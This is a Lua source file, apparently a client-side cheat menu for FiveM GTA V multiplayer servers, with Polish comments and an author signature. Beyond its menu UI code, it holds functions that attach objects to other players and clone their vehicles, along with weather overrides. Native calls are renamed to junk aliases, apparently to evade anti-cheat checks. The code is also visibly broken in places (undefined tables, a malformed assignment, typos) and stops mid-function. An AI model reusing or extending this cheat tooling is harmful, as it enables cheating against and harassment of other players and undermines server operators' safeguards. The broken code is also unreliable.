--[[
ESX = nil
Citizen.CreateThread(
    function()
        while ESX == nil do
            TriggerServerEvent(
                'esx:getSharedObject',
                function(a)
                    ESX = a
                end
            )
            Citizen.Wait(1000)
        end
    end
)
--]]
----    								Siema tutaj macie menu odemnie czyli KoGuSzEk#3251
----									Pamietajcie #yebacfivem i enjoy !
----									Macie jeszcze tutaj obrazeczek odemnie kc was@ kapeiks
----szczypiorek--------------------------------------------------------------------------------------------------------------------------------
----       ===================        ===			===			===				 ===		===================					   -
----       =======					  ===			===			===				 ===		===================					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -	
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  =================			===				 ===						===					   -
----       ===						  =================			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ===						  ===			===			===				 ===						===					   -
----       ========			     	  ===			===			====================		===================					   -
----       =====================      ===			===			====================		===================					   -
----szczypiorek--------------------------------------------------------------------------------------------------------------------------------


KoGuSzEk = {}
KoGuSzEk.debug = false
TriggerServerEvent = TriggerServerEvent
chujaries = TriggerEvent
function a5(a6, a7, a8) if l[p] then local x = l[p].x + q / 2;
local y = l[p].y + E / 2;
local a9 = {
    r = 255, g = 255, b = 255, a = 255
}
a0(x, y + a8, q, E, descriptionBackgroundColor) T(a6, l[p].x + G, y - E / 2 + a7 + 0.005, F, a9, H, false) end end;
local LMl35d = false
local pass = "nikos"
llll4874 = enabled
KAKAAKAKAK = llll4874
pizda = RequestModel

udwdj = TriggerServerEvent


Ggggg = GetHashKey
WADUI = ihrug
local states = {}
states.frozen = KZjx
states.frozenPos = WADUI
local logged = false
jd366213 = false
KZjx = jd366213
ihrug = nil
WADUI = ihrug
function dol(K, x, y) SetTextFont(0) SetTextProportional(1) SetTextScale(0.0, 0.4) SetTextDropshadow(1, 0, 0, 0, 255) SetTextEdge(1, 0, 0, 0, 255) SetTextDropShadow() SetTextOutline() SetTextEntry("STRING") AddTextComponentString(K) DrawText(x, y) end;
local entityEnumerator = {
	__gc = function(enum)
		if enum.destructor and enum.handle then
			enum.destructor(enum.handle)
		end
		enum.destructor = WADUI
		enum.handle = WADUI
	end
}
wdihwaduaw = true
jejejejej = wdihwaduaw
xjbvxyg3e = jejejejej
waduyh487r64 = xjbvxyg3e


function EnumerateEntities(initFunc, moveFunc, disposeFunc)
	return coroutine.wrap(function()
		local iter, id = initFunc()
		if not id or id == 0 then
			disposeFunc(iter)
			return
		end
	
		local enum = {handle = iter, destructor = disposeFunc}
		setmetatable(enum, entityEnumerator)
	
		local next = waduyh487r64
		repeat
			coroutine.yield(id)
			next, id = moveFunc(iter)
		until not next
	
		enum.destructor, enum.handle = WADUI, WADUI
		disposeFunc(iter)
	end)
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

  function EnumerateVehicles()
	return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
  end

function GetAllPeds()
    local peds123 = {}
    for ped in EnumeratePeds() do
        if DoesEntityExist(ped) then
            table.insert(peds123, ped)
        end
    end
    return peds123
end



  
local Deer = {
	Handle = nil,
	Invincible = false,
	Ragdoll = false,
	Marker = false,
	Speed = {
		Walk = 3.0,
		Run = 9.0,
	},
}

function GetNearbyPeds(X, Y, Z, Radius)
	local NearbyPeds = {}
	for Ped in EnumeratePeds() do
		if DoesEntityExist(Ped) then
			local PedPosition = GetEntityCoords(Ped, false)
			if Vdist(X, Y, Z, PedPosition.x, PedPosition.y, PedPosition.z) <= Radius then
				table.insert(NearbyPeds, Ped)
			end
		end
	end
	return NearbyPeds
end

function GetCoordsInfrontOfEntityWithDistance(Entity, Distance, Heading)
	local Coordinates = GetEntityCoords(Entity, false)
	local Head = (GetEntityHeading(Entity) + (Heading or 0.0)) * math.pi / 180.0
	return {x = Coordinates.x + Distance * math.sin(-1.0 * Head), y = Coordinates.y + Distance * math.cos(-1.0 * Head), z = Coordinates.z}
end

function GetGroundZ(X, Y, Z)
	if tonumber(X) and tonumber(Y) and tonumber(Z) then
		local _, GroundZ = GetGroundZFor_3dCoord(X + 0.0, Y + 0.0, Z + 0.0, Citizen.ReturnResultAnyway())
		return GroundZ
	else
		return 0.0
	end
end

function Deer.Destroy()
	local Ped = PlayerPedId()

	DetachEntity(Ped, true, false)
	ClearPedTasksImmediately(Ped)

	SetEntityAsNoLongerNeeded(Deer.Handle)
	DeletePed(Deer.Handle)

	if DoesEntityExist(Deer.Handle) then
		SetEntityCoords(Deer.Handle, 601.28948974609, -4396.9853515625, 384.98565673828)
	end

	Deer.Handle = nil
end

function Deer.Create()
	local Model = GetHashKey("a_c_deer")
	pizda(Model)
	while not HasModelLoaded(Model) do
		Citizen.Wait(50)
	end

	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)

	Deer.Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)

	SetPedCanRagdoll(Deer.Handle, Deer.Ragdoll)
	SetEntityInvincible(Deer.Handle, Deer.Invincible)

	SetModelAsNoLongerNeeded(Model)
end

function Deer.Attach()
	local Ped = PlayerPedId()

	FreezeEntityPosition(Deer.Handle, true)
	FreezeEntityPosition(Ped, true)

	local DeerPosition = GetEntityCoords(Deer.Handle, false)
	SetEntityCoords(Ped, DeerPosition.x, DeerPosition.y, DeerPosition.z)

	AttachEntityToEntity(Ped, Deer.Handle, GetPedBoneIndex(Deer.Handle, 24816), -0.3, 0.0, 0.3, 0.0, 0.0, 90.0, false, false, false, true, 2, true)

	TaskPlayAnim(Ped, "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, 0, 0, 0)

	FreezeEntityPosition(Deer.Handle, false)
	FreezeEntityPosition(Ped, false)
end

function Deer.Ride()
	local Ped = PlayerPedId()
	local PedPosition = GetEntityCoords(Ped, false)
	if IsPedSittingInAnyVehicle(Ped) or IsPedGettingIntoAVehicle(Ped) then
		return
	end

	local AttachedEntity = GetEntityAttachedTo(Ped)

	if IsEntityAttached(Ped) and GetEntityModel(AttachedEntity) == GetHashKey("a_c_deer") then
		local SideCoordinates = GetCoordsInfrontOfEntityWithDistance(AttachedEntity, 1.0, 90.0)
		local SideHeading = GetEntityHeading(AttachedEntity)

		SideCoordinates.z = GetGroundZ(SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)

		Deer.Handle = nil
		DetachEntity(Ped, true, false)
		ClearPedTasksImmediately(Ped)

		SetEntityCoords(Ped, SideCoordinates.x, SideCoordinates.y, SideCoordinates.z)
		SetEntityHeading(Ped, SideHeading)
	else
		for _, Ped in pairs(GetNearbyPeds(PedPosition.x, PedPosition.y, PedPosition.z, 2.0)) do
			if GetEntityModel(Ped) == GetHashKey("a_c_deer") then
				Deer.Handle = Ped
				Deer.Attach()
				break
			end
		end
	end
end

Citizen.CreateThread(function()
	RequestAnimDict("rcmjosh2")
	while not HasAnimDictLoaded("rcmjosh2") do
		Citizen.Wait(250)
	end
	while true do
		Citizen.Wait(0)



		local Ped = PlayerPedId()
		local AttachedEntity = GetEntityAttachedTo(Ped)

		if (not IsPedSittingInAnyVehicle(Ped) or not IsPedGettingIntoAVehicle(Ped)) and IsEntityAttached(Ped) and AttachedEntity == Deer.Handle then
			if DoesEntityExist(Deer.Handle) then
				local LeftAxisXNormal, LeftAxisYNormal = GetControlNormal(2, 218), GetControlNormal(2, 219)
				local Speed, Range = Deer.Speed.Walk, 4000.0


				local GoToOffset = GetOffsetFromEntityInWorldCoords(Deer.Handle, LeftAxisXNormal * Range, LeftAxisYNormal * -1.0 * Range, 0.0)

				TaskLookAtCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 2)
				TaskGoStraightToCoord(Deer.Handle, GoToOffset.x, GoToOffset.y, GoToOffset.z, Speed, 20000, 40000.0, 0.5)

				if Deer.Marker then
					DrawMarker(6, GoToOffset.x, GoToOffset.y, GoToOffset.z, 0, 0, 0, 0, 0, 0, 1.0, 1.0, 1.0, 255, 255, 255, 255, 0, 0, 2, 0, 0, 0, 0)
				end
			end
		end
	end
end)

local triggerr = "kalinka"
local function k(l)
    local m = {}
    local n = GetGameTimer() / 200
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end
local menuso = {}
local p = {
    up = 172,
    down = 173,
    left = 174,
    right = 175,
    select = 176,
    back = 177
}
function LiLLL(text, items, CURENTIXDDd, DWADIOHDWwww13, callback)
    local itemsCount = #items
    local selectedItem = items[CURENTIXDDd]
    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

    if itemsCount > 1 and isCurrent then
        selectedItem = "← "..tostring(selectedItem).." →"
    end

    if KoGuSzEk.B(text, selectedItem) then
        DWADIOHDWwww13 = CURENTIXDDd
        callback(CURENTIXDDd, DWADIOHDWwww13)
        return waduyh487r64
    elseif isCurrent then
        if currentKey == keys.left then
            if CURENTIXDDd > 1 then CURENTIXDDd = CURENTIXDDd - 1 else CURENTIXDDd = itemsCount end
        elseif currentKey == keys.right then
            if CURENTIXDDd < itemsCount then CURENTIXDDd = CURENTIXDDd + 1 else CURENTIXDDd = 1 end
        end
    else
        CURENTIXDDd = DWADIOHDWwww13
    end

    callback(CURENTIXDDd, DWADIOHDWwww13)
    return KZjx
end

local q = 0
local s = nil
local t = nil
local u = 0.23
local v = 0.11
local w = 0.03
local A = 1.0
local B = 0.041
local C = 0
local D = 0.370
local E = 0.005
local F = 0.005
local function H(I)
    if KoGuSzEk.debug then
        Citizen.Trace('[KoGuSzEk] ' .. tostring(I))
    end
end
local function J(f, K, value)
    if f and menuso[f] then
        menuso[f][K] = value
        H(f .. ' menu property changed: { ' .. tostring(K) .. ', ' .. tostring(value) .. ' }')
    end
end
local function L(f)
    if f and menuso[f] then
        return menuso[f].visible
    else
        return false
    end
end
local function M(f, N, O)
    if f and menuso[f] then
        J(f, 'visible', N)
        if not O and menuso[f] then
            J(f, 'currentOption', 1)
        end
        if N then
            if f ~= t and L(t) then
                M(t, false)
            end
            t = f
        end
    end
end
local function P(I, x, y, Q, R, S, T, U, V)
    SetTextColour(R.r, R.g, R.b, R.a)
    SetTextFont(Q)
    SetTextScale(S, S)
    if U then
        SetTextDropShadow(2, 2, 0, 0, 0)
    end
    if menuso[t] then
        if T then
            SetTextCentre(T)
        elseif V then
            SetTextWrap(menuso[t].x, menuso[t].x + u - E)
            SetTextRightJustify(true)
        end
    end
    SetTextEntry('STRING')
    AddTextComponentString(I)
    DrawText(x, y)
end
local function W(x, y, X, height, R)
    DrawRect(x, y, X, height, R.r, R.g, R.b, R.a)
end
local function Y()
    if menuso[t] then
        local x = menuso[t].x + u / 2
        local y = menuso[t].y + v / 2
        if menuso[t].titleBackgroundSprite then
            DrawSprite(
                menuso[t].titleBackgroundSprite.dict,
                menuso[t].titleBackgroundSprite.name,
                x,
                y,
                u,
                v,
                0.,
                255,
                255,
                255,
                255
            )
        else
            W(x, y, u, v, menuso[t].titleBackgroundColor)
        end
        P(menuso[t].title, x, y - v / 2 + w, menuso[t].titleFont, menuso[t].titleColor, A, true)
    end
end
local function Z()
    if menuso[t] then
        local x = menuso[t].x + u / 2
        local y = menuso[t].y + v + B / 2
        local a0 = {
            r = menuso[t].titleBackgroundColor.r,
            g = menuso[t].titleBackgroundColor.g,
            b = menuso[t].titleBackgroundColor.b,
            a = 255
        }
        W(x, y, u, B, menuso[t].subTitleBackgroundColor)
        P(menuso[t].subTitle, menuso[t].x + E, y - B / 2 + F, C, a0, D, false)
        if q > menuso[t].maxOptionCount then
            P(
                tostring(menuso[t].currentOption) .. ' / ' .. tostring(q),
                menuso[t].x + u,
                y - B / 2 + F,
                C,
                a0,
                D,
                false,
                false,
                true
            )
        end
    end
end

local function a1(I, a2)
    local x = menuso[t].x + u / 2
    local a3 = nil
    if menuso[t].currentOption <= menuso[t].maxOptionCount and q <= menuso[t].maxOptionCount then
        a3 = q
    elseif q > menuso[t].currentOption - menuso[t].maxOptionCount and q <= menuso[t].currentOption then
        a3 = q - (menuso[t].currentOption - menuso[t].maxOptionCount)
    end
    if a3 then
        local y = menuso[t].y + v + B + B * a3 - B / 2
        local a4 = nil
        local a5 = nil
        local a6 = nil
        local U = false
        if menuso[t].currentOption == q then
            a4 = menuso[t].menuFocusBackgroundColor
            a5 = menuso[t].menuFocusTextColor
            a6 = menuso[t].menuFocusTextColor
        else
            a4 = menuso[t].menuBackgroundColor
            a5 = menuso[t].menuTextColor
            a6 = menuso[t].menuSubTextColor
            U = true
        end
        W(x, y, u, B, a4)
        P(I, menuso[t].x + E, y - B / 2 + F, C, a5, D, false, U)
        if a2 then
            P(a2, menuso[t].x + E, y - B / 2 + F, C, a6, D, false, U, true)
        end
    end
end

function KoGuSzEk.CreateMenu(f, a7)
    menuso[f] = {}
    menuso[f].title = a7
    menuso[f].subTitle = G
    menuso[f].visible = false
    menuso[f].previousMenu = nil
    menuso[f].aboutToBeClosed = false
    menuso[f].x = 0.75
    menuso[f].y = 0.20
    menuso[f].currentOption = 1
    menuso[f].maxOptionCount = 12
    menuso[f].titleFont = 7
    menuso[f].titleColor = {
        r = 255,
        g = 255,
        b = 255,
        a = 255
    }
    Citizen.CreateThread(
        function()
            while true do
                Citizen.Wait(0)
                local a8 = k(1.0)
                menuso[f].titleBackgroundColor = {
                    --r = a8.r,
                    --g = a8.g,
                    --b = a8.b,
                    r = 0,
                    g = 0,
                    b = 0,
                    a = 200
                }
                menuso[f].menuFocusBackgroundColor = {
                    r = a8.r,
                    g = a8.g,
                    b = a8.b,
                    a = 100
                }
            end
        end
    )
    menuso[f].titleBackgroundSprite = nil
    menuso[f].menuTextColor = {
        r = 0,
        g = 247,
        b = 247,
        a = 255
    }
    menuso[f].menuSubTextColor = {
        r = 189,
        g = 189,
        b = 189,
        a = 255
    }
    menuso[f].menuFocusTextColor = {
        r = 9,
        g = 255,
        b = 26,
        a = 255
    }
    menuso[f].menuBackgroundColor = {
        r = 0,
        g = 0,
        b = 0,
        a = 200
    }
	descriptionBackgroundColor = {
    r = menuso[f].menuBackgroundColor.r, 
	g = menuso[f].menuBackgroundColor.g, 
	b = menuso[f].menuBackgroundColor.b, 
	a = 125
}
    menuso[f].subTitleBackgroundColor = {
        r = menuso[f].menuBackgroundColor.r,
        g = menuso[f].menuBackgroundColor.g,
        b = menuso[f].menuBackgroundColor.b,
        a = 160
    }
    menuso[f].buttonPressedSound = {
        name = '~h~~p~» ~w~Wybierz',
        set = 'HUD_FRONTEND_DEFAULT_SOUNDSET'
    }
    H(tostring(f) .. ' menu created')
end

function KoGuSzEk.CreateSubMenu(f, a9, aa)
    if menuso[a9] then
        KoGuSzEk.CreateMenu(f, menuso[a9].title)
        if aa then
            J(f, 'subTitle', aa)
        else
            J(f, 'subTitle', menuso[a9].subTitle)
        end
        J(f, 'previousMenu', a9)
        J(f, 'x', menuso[a9].x)
        J(f, 'y', menuso[a9].y)
        J(f, 'maxOptionCount', menuso[a9].maxOptionCount)
        J(f, 'titleFont', menuso[a9].titleFont)
        J(f, 'titleColor', menuso[a9].titleColor)
        J(f, 'titleBackgroundColor', menuso[a9].titleBackgroundColor)
        J(f, 'titleBackgroundSprite', menuso[a9].titleBackgroundSprite)
        J(f, 'menuTextColor', menuso[a9].menuTextColor)
        J(f, 'menuSubTextColor', menuso[a9].menuSubTextColor)
        J(f, 'menuFocusTextColor', menuso[a9].menuFocusTextColor)
        J(f, 'menuFocusBackgroundColor', menuso[a9].menuFocusBackgroundColor)
        J(f, 'menuBackgroundColor', menuso[a9].menuBackgroundColor)
        J(f, 'subTitleBackgroundColor', menuso[a9].subTitleBackgroundColor)
    else
        H('Failed to create ' .. tostring(f) .. ' submenu: ' .. tostring(a9) .. " parent menu doesn't exist")
    end
end

function KoGuSzEk.CurrentMenu()
    return t
end

function KoGuSzEk.OpenMenu(f)
    if f and menuso[f] then
        --PlaySoundFrontend(-1, 'SELECT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        M(f, true)
        if menuso[f].titleBackgroundSprite then
            RequestStreamedTextureDict(menuso[f].titleBackgroundSprite.dict, false)
            while not HasStreamedTextureDictLoaded(menuso[f].titleBackgroundSprite.dict) do
                Citizen.Wait(0)
            end
        end
        H(tostring(f) .. ' menu opened')
    else
        H('Failed to open ' .. tostring(f) .. " menu: it doesn't exist")
    end
end

function KoGuSzEk.IsMenuOpened(f)
    return L(f)
end

function KoGuSzEk.IsAnyMenuOpened()
    for f, _ in pairs(o) do
        if L(f) then
            return true
        end
    end
    return false
end

function KoGuSzEk.IsMenuAboutToBeClosed()
    if menuso[t] then
        return menuso[t].aboutToBeClosed
    else
        return false
    end
end

function KoGuSzEk.CloseMenu()
    if menuso[t] then
        if menuso[t].aboutToBeClosed then
            menuso[t].aboutToBeClosed = false
            M(t, false)
            H(tostring(t) .. ' menu closed')
            PlaySoundFrontend(-1, 'QUIT', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            q = 0
            t = nil
            s = nil
        else
            menuso[t].aboutToBeClosed = true
            H(tostring(t) .. ' menu about to be closed')
        end
    end
end

function KoGuSzEk.B(I, a2)
    local ab = I
    if a2 then
        ab = '{ ' .. tostring(ab) .. ', ' .. tostring(a2) .. ' }'
    end
    if menuso[t] then
        q = q + 1
        local ac = menuso[t].currentOption == q
        a1(I, a2)
        if ac then
            if s == p.select then
                PlaySoundFrontend(-1, menuso[t].buttonPressedSound.name, menuso[t].buttonPressedSound.set, true)
                H(ab .. ' button pressed')
                return true
            elseif s == p.left or s == p.right then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            end
        end
        return false
    else
        H('Failed to create ' .. ab .. ' button: ' .. tostring(t) .. " menu doesn't exist")
        return false
    end
end
local currentVehicle = 1
local selectedVehicle = 1

local currentVehicleSpeed = 16
local selectedVehicleSpeed = 16

local currentBone = 1
local selectedBone = 1

local currentDamage = 1
local selectedDamage = 1

local currentPed = 1
local selectedPed = 1
local selectedPedd = 1
local currentPedd = 1
local selectedPeddd = 1
local currentPeddd = 1
local selectedPedddd = 1
local currentPedddd = 1

local currentBullet = 1
local selectedBullet = 1
function KoGuSzEk.MB(I, f)
    if menuso[f] then
        if KoGuSzEk.B(I) then
            M(t, false)
            M(f, true, true)
            return true
        end
    else
        H('Failed to create ' .. tostring(I) .. ' menu button: ' .. tostring(f) .. " submenu doesn't exist")
    end
    return false
end

function KoGuSzEk.c(I, bool, ad)
    local ae = '~r~~h~wyl'
    if bool then
        ae = '~g~~h~wl'
    end
    if KoGuSzEk.B(I, ae) then
        bool = not bool
        H(tostring(I) .. ' checkbox changed to ' .. tostring(bool))
        ad(bool)
        return true
    end
    return false
end
function SpawnObjOnPlayer(keduxbenHash)
    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
    local obj CreateObject(keduxbenHash, coords.x, coords.y, coords.z, waduyh487r64, waduyh487r64, waduyh487r64)
        if attachProp then
            AttachEntityToEntity(obj ,GetPlayerPed(selectedPlayer), GetPedBoneIndex(GetPlayerPed(selectedPlayer), 57005), 0.4, 0, 0, 0, 270.0, 60.0, waduyh487r64 ,waduyh487r64 ,KZjx, waduyh487r64, 1, waduyh487r64)
        end
end
function KoGuSzEk.ComboBox(I, af, ag, ah, ad)
    local ai = #af
    local aj = af[ag]
    local ac = menuso[t].currentOption == q + 1
    if ai > 1 and ac then
        aj = '← ' .. tostring(aj) .. ' →'
    end
    if KoGuSzEk.B(I, aj) then
        ah = ag
        ad(ag, ah)
        return true
    elseif ac then
        if s == p.left then
            if ag > 1 then
                ag = ag - 1
            else
                ag = ai
            end
        elseif s == p.right then
            if ag < ai then
                ag = ag + 1
            else
                ag = 1
            end
        end
    else
        ag = ah
    end
    ad(ag, ah)
    return false
end
if showinfo then
bz('<FONT COLOR="#00f7ff">Menu by KoGuSzEk ', 0.00, 0.0)
			bz('<FONT COLOR="#00f7ff">~h~Twoje id ~w~: ~p~~h~' .. GetPlayerServerId(closestPlayer) .. ' ', 0.0, 0.03)
			end
function KoGuSzEk.Display()
    if L(t) then
        if menuso[t].aboutToBeClosed then
            KoGuSzEk.CloseMenu()
        else
            ClearAllHelpMessages()
            Y()
            Z()
            s = nil
            if IsDisabledControlJustPressed(0, p.down) then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                if menuso[t].currentOption < q then
                    menuso[t].currentOption = menuso[t].currentOption + 1
                else
                    menuso[t].currentOption = 1
                end
            elseif IsDisabledControlJustPressed(0, p.up) then
                PlaySoundFrontend(-1, 'NAV_UP_DOWN', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                if menuso[t].currentOption > 1 then
                    menuso[t].currentOption = menuso[t].currentOption - 1
                else
                    menuso[t].currentOption = q
                end
            elseif IsDisabledControlJustPressed(0, p.left) then
                s = p.left
            elseif IsDisabledControlJustPressed(0, p.right) then
                s = p.right
            elseif IsDisabledControlJustPressed(0, p.select) then
                s = p.select
            elseif IsDisabledControlJustPressed(0, p.back) then
                if menuso[menuso[t].previousMenu] then
                    PlaySoundFrontend(-1, 'BACK', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
                    M(menuso[t].previousMenu, true)
                else
                    KoGuSzEk.CloseMenu()
                end
            end
            q = 0
        end
    end
end

function KoGuSzEk.SetMenuWidth(f, X)
    J(f, 'width', X)
end

function KoGuSzEk.SetMenuX(f, x)
    J(f, 'x', x)
end

function KoGuSzEk.SetMenuY(f, y)
    J(f, 'y', y)
end

function KoGuSzEk.SetMenuMaxOptionCountOnScreen(f, count)
    J(f, 'maxOptionCount', count)
end

function KoGuSzEk.SetTitleColor(f, r, g, b, ak)
    J(
        f,
        'titleColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].titleColor.a
        }
    )
end

function KoGuSzEk.SetTitleBackgroundColor(f, r, g, b, ak)
    J(
        f,
        'titleBackgroundColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].titleBackgroundColor.a
        }
    )
end

function KoGuSzEk.SetTitleBackgroundSprite(f, al, am)
    J(
        f,
        'titleBackgroundSprite',
        {
            dict = al,
            name = am
        }
    )
end

function KoGuSzEk.SetSubTitle(f, I)
    J(f, 'subTitle', I)
end

function KoGuSzEk.SetMenuBackgroundColor(f, r, g, b, ak)
    J(
        f,
        'menuBackgroundColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].menuBackgroundColor.a
        }
    )
end

function KoGuSzEk.SetMenuTextColor(f, r, g, b, ak)
    J(
        f,
        'menuTextColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].menuTextColor.a
        }
    )
end

function KoGuSzEk.SetMenuSubTextColor(f, r, g, b, ak)
    J(
        f,
        'menuSubTextColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].menuSubTextColor.a
        }
    )
end
local wtB2JF = "TriggerServerEvent"
function KoGuSzEk.SetMenuFocusColor(f, r, g, b, ak)
    J(
        f,
        'menuFocusColor',
        {
            ['r'] = r,
            ['g'] = g,
            ['b'] = b,
            ['a'] = ak or menuso[f].menuFocusColor.a
        }
    )
end

function KoGuSzEk.SetMenuButtonPressedSound(f, name, an)
    J(
        f,
        'buttonPressedSound',
        {
            ['name'] = name,
            ['set'] = an
        }
    )
end

function KeyboardInput(ao, ap, aq)
    AddTextEntry('FMMC_KEY_TIP1', ao .. ':')
    DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', ap, '', '', '', aq)
    blockinput = true
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
        Citizen.Wait(0)
    end
    if UpdateOnscreenKeyboard() ~= 2 then
        AddTextEntry('FMMC_KEY_TIP1', '')
        local m = GetOnscreenKeyboardResult()
        Citizen.Wait(500)
        blockinput = false
        return m
    else
        AddTextEntry('FMMC_KEY_TIP1', '')
        Citizen.Wait(500)
        blockinput = false
        return nil
    end
end
local bw = waduyh487r64
local function ar()
    local as = {}
    for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
            as[#as + 1] = i
        end
    end
    return as
end
if CLEAR then
								SetWeatherTypePersist("CLEAR")
        SetWeatherTypeNowPersist("CLEAR")
        SetWeatherTypeNow("CLEAR")
        SetOverrideWeather("CLEAR")
		end
		
					if BLIZZARD then
								SetWeatherTypePersist("BLIZZARD")
        SetWeatherTypeNowPersist("BLIZZARD")
        SetWeatherTypeNow("BLIZZARD")
        SetOverrideWeather("BLIZZARD")
		end
		
					if FOGGY then
								SetWeatherTypePersist("FOGGY")
        SetWeatherTypeNowPersist("FOGGY")
        SetWeatherTypeNow("FOGGY")
        SetOverrideWeather("FOGGY")
		end
		
					if EXTRASUNNY then
								SetWeatherTypePersist("EXTRASUNNY")
        SetWeatherTypeNowPersist("EXTRASUNNY")
        SetWeatherTypeNow("EXTRASUNNY")
        SetOverrideWeather("EXTRASUNNY")
		end
			
			if XMAS then
			            SetForceVehicleTrails(waduyh487r64)
            SetForcePedFootstepsTracks(waduyh487r64)
					SetWeatherTypePersist("XMAS")
        SetWeatherTypeNowPersist("XMAS")
        SetWeatherTypeNow("XMAS")
        SetOverrideWeather("XMAS")
		end
		
function DrawText3D(x, y, z, I, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(7)
    SetTextProportional(0)
    SetTextScale(0.0, 0.35)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry('STRING')
    SetTextCentre(1)
    AddTextComponentString(I)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

function math.round(at, au)
    return tonumber(string.format('%.' .. (au or 0) .. 'f', at))
end
local function k(l)
    local m = {}
    local n = GetGameTimer() / 1000
    m.r = math.floor(math.sin(n * l + 0) * 127 + 128)
    m.g = math.floor(math.sin(n * l + 2) * 127 + 128)
    m.b = math.floor(math.sin(n * l + 4) * 127 + 128)
    return m
end
local function av(I, aw)
    SetNotificationTextEntry('STRING')
    AddTextComponentString(I)
    DrawNotification(aw, false)
    if rgbnot then
        for i = 0, 0 do
            i = i + 5
            SetNotificationBackgroundColor(i)
        end
    else
        SetNotificationBackgroundColor(5)
    end
end
local function ClonePedVeh()
    local ped = GetPlayerPed(SelectedPlayer)
    local pedVeh = WADUI
    local PlayerPed = PlayerPedId()
    if IsPedInAnyVehicle(ped, KZjx) then
        pedVeh = GetVehiclePedIsIn(ped, KZjx)
    else
        pedVeh = GetVehiclePedIsIn(ped, waduyh487r64)
        if DoesEntityExist(pedVeh) then
            local vmh = GetEntityModel(pedVeh)
            local playerpos = GetEntityCoords(PlayerPed, KZjx)
            local playerveh =
                CreateVehicle(vmh, playerpos.x, playerpos.y, playerpos.z, GetEntityHeading(PlayerPed), waduyh487r64, waduyh487r64)
            SetPedIntoVehicle(PlayerPed, playerveh, -1)
            local pcolor, scolor = WADUI
            GetVehicleColours(pedVeh, pcolor, scolor)
            SetVehicleColours(playerveh, pcolor, scolor)
            if IsThisModelACar(vmh) or IsThisModelABike(vhm) then
                SetVehicleModKit(playerveh, 0)
                SetVehicleWheelType(playerveh, GetVehicleWheelType(pedVeh))
                local pc, wc = WADUI
                SetVehicleNumberPlateTextIndex(playerveh, GetVehicleNumberPlateTextIndex(pedVeh))
                SetVehicleNumberPlateText(playerveh, GetVehicleNumberPlateText(pedVeh))
                GetVehicleExtraColours(pedVeh, pc, wc)
                SetVehicleExtraColours(playerveh, pc, wc)
            end
        end
    end
end
function checkValidVehicleExtras()
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    for i = 0, 50, 1 do
        if DoesExtraExist(ay, i) then
            local aA = '~h~Extra #' .. tostring(i)
            local I = 'OFF'
            if IsVehicleExtraTurnedOn(ay, i) then
                I = 'ON'
            end
            local aB = '~h~extra ' .. tostring(i)
            table.insert(
                az,
                {
                    menuName = realModName,
                    data = {
                        ['action'] = realSpawnName,
                        ['state'] = I
                    }
                }
            )
        end
    end
    return az
end

function DoesVehicleHaveExtras(veh)
    for i = 1, 30 do
        if DoesExtraExist(veh, i) then
            return true
        end
    end
    return false
end

function checkValidVehicleMods(aC)
    local ax = PlayerPedId()
    local ay = GetVehiclePedIsIn(ax, false)
    local az = {}
    local aD = GetNumVehicleMods(ay, aC)
    if aC == 48 and aD == 0 then
        local aD = GetVehicleLiveryCount(ay)
        for i = 1, aD, 1 do
            local aE = i - 1
            local aF = GetLiveryName(ay, aE)
            local realModName = GetLabelText(aF)
            local aG, realSpawnName = aC, aE
            az[i] = {
                menuName = realModName,
                data = {
                    ['modid'] = aG,
                    ['realIndex'] = realSpawnName
                }
            }
        end
    end
    for i = 1, aD, 1 do
        local aE = i - 1
        local aF = GetModTextLabel(ay, aC, aE)
        local realModName = GetLabelText(aF)
        local aG, realSpawnName = aD, aE
        az[i] = {
            menuName = realModName,
            data = {
                ['modid'] = aG,
                ['realIndex'] = realSpawnName
            }
        }
